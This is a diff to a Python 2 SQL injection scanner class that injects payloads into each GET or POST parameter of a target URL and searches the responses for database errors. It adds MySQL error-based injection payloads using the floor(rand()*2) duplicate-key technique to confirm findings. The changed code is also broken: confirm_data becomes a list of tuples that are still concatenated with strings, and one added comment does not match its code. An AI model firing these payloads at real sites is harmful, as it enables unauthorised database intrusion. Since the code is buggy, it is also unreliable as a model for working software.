@@ -35,6 +35,7 @@ class classSQL(object):
         self.get_value()
     
     def get_value(self, payload=None):
+        # to check if the file upload, if uploaded, return directly
         self.to_check_list = []
         self.aim_error_list = []
         if payload is None: payload=classSQL.payload
@@ -46,7 +47,7 @@ class classSQL(object):
             for p in payload:
                 for param in values.keys():
                     temp_dict = copy.deepcopy(values)
-                    temp_dict[param] =  p
+                    temp_dict[param] =  temp_dict[param] + p
                     temp_query = urllib.urlencode(temp_dict)
                     self.to_check_list.append(urlparse.urlunparse((_.scheme, _.netloc, _.path, _.params, temp_query, _.fragment)))
         elif self.method == 'POST':
@@ -71,7 +72,7 @@ class classSQL(object):
                         self.to_check_list.append(temp_query)
             
         
-        print "self.to_check_list = {}".format(self.to_check_list)
+        # print "self.to_check_list = {}".format(self.to_check_list)
 
 
     def search_errormsg(self, response):
@@ -176,14 +177,16 @@ class classSQL(object):
 
     def confirm_sqli(self):
         # now only test mysql
-        confirm_data = ['"', "'", "')", '")', ""]
+        confirm_data = [('"','"'), ("'", "'"), ("')","'("), ('")', '"('), ("", "")]
         a = list(string.ascii_lowercase)
         random.shuffle(a)
         anchor = ''.join(a[:10])
 
         for d in confirm_data:
-            confirm_value1 = d + 'and(select 1 from(select count(*),concat((select concat(' + anchor + ') from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)and' + d
+            confirm_value1 = d + ' and(select 1 from(select count(*),concat((select concat(' + anchor + ') from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)and ' + d
             confirm_value2 = d + '(select 1 and row(1,1)>(select count(*),concat(concat(' + anchor + '),floor(rand()*2))x from (select 1 union select 2)a group by x limit 1))' + d
+            print confirm_value1
+            print confirm_value2
             self.get_value(payload=[confirm_value1, confirm_value2])
             print "=========== confirm sql error injection============"
             self.start_test()
@@ -209,7 +212,7 @@ class classSQL(object):
                     # to confirm the error like awvs
             except Exception as e:
                 print repr(e)
-        print self.aim_error_list
+        # print self.aim_error_list
 
 
 def sqli_test(url, headers, data=None):
@@ -224,10 +227,10 @@ def sqli_test(url, headers, data=None):
     t = a.aim_error_list
     if a.aim_error_list:
         a.confirm_sqli()
-        # if a.aim_error_list:
-        #     # print "10 [found SQLi] {}".format(a.aim_error_list)
-        # else:
-            # print "5 [found SQLi no Confirm] {}".format(t)
+        if a.aim_error_list:
+            print "10 [found SQLi] {}".format(a.aim_error_list)
+        else:
+            print "5 [found SQLi no Confirm] {}".format(t)
     return a.aim_error_list
 
 
